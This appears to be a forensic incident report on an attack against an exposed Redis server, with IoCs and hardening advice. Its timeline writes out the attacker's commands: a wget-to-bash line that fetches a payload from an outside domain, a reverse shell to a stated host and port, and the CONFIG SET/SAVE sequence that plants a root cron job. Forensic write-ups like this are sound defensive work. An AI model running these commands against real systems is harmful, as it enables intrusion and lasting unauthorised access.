# Post-Incident Forensic Report: Redis Exploitation and RCE

------------------------------------------------------------------------

## 1. Executive Summary

This report analyzes a multi-stage compromise of a Redis instance.\
The attacker leveraged weak authentication to gain initial access,
followed by:

-   Exfiltration of sensitive data\
-   Execution of arbitrary commands (RCE)\
-   Establishment of multiple persistence backdoors

The attack culminated in persistent system-level access via scheduled
tasks and SSH key injection.

------------------------------------------------------------------------

## 2. Technical Timeline & Methodology

### Phase I: Initial Access and Reconnaissance

The attacker connected to the Redis service on:

    Port: 6379

Authentication was granted using the password:

    1943567864

The attacker enumerated database keys and targeted:

    users_table

Command executed:

``` bash
HGETALL users_table
```

------------------------------------------------------------------------

### Phase II: Remote Code Execution (RCE)

The attacker exploited the Redis MODULE capability to achieve OS command
execution.

System reconnaissance:

``` bash
uname -a
```

Cleanup:

``` bash
rm -v ./x10SPFHN.so
```

Payload delivery:

``` bash
wget http://files.pypi-install.com/... -O - | bash
```

------------------------------------------------------------------------

### Phase III: Obfuscation and Payload Analysis

The payload used:

-   Variable substitution\
-   Reversed Base64 encoding\
-   Runtime reconstruction

Deobfuscated behavior revealed:

-   Reverse shell to 10.10.0.200:1337\
-   SSH key injection

------------------------------------------------------------------------

## 3. Persistence Mechanisms

### SSH Backdoor

File modified:

    ~/.ssh/authorized_keys

### MOTD Hijacking

File modified:

    /etc/update-motd.d/00-header

### Cron Persistence

Commands used:

``` bash
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SAVE
```

------------------------------------------------------------------------

## 4. Indicators of Compromise (IoC)

  Type                 Value
  -------------------- -------------------------------------
  Attacker IP          10.10.0.90
  C2 Server            10.10.0.200
  Malicious Domain     files.pypi-install.com
  Malicious Files      x10SPFHN.so, gezsdSC8i3, VgLy8VOZxo
  Reverse Shell Port   1337

------------------------------------------------------------------------

## 5. Remediation Recommendations

### Identity & Access

-   Rotate Redis password
-   Remove unauthorized SSH keys

### Redis Hardening

    rename-command CONFIG ""
    rename-command MODULE ""
    rename-command SAVE ""
    rename-command SLAVEOF ""

### Network Security

    bind 127.0.0.1

Restrict external access to port 6379.

------------------------------------------------------------------------

## Conclusion

This compromise demonstrates the risks of exposed Redis instances with
weak authentication. Proper hardening, monitoring, and access control
are critical.
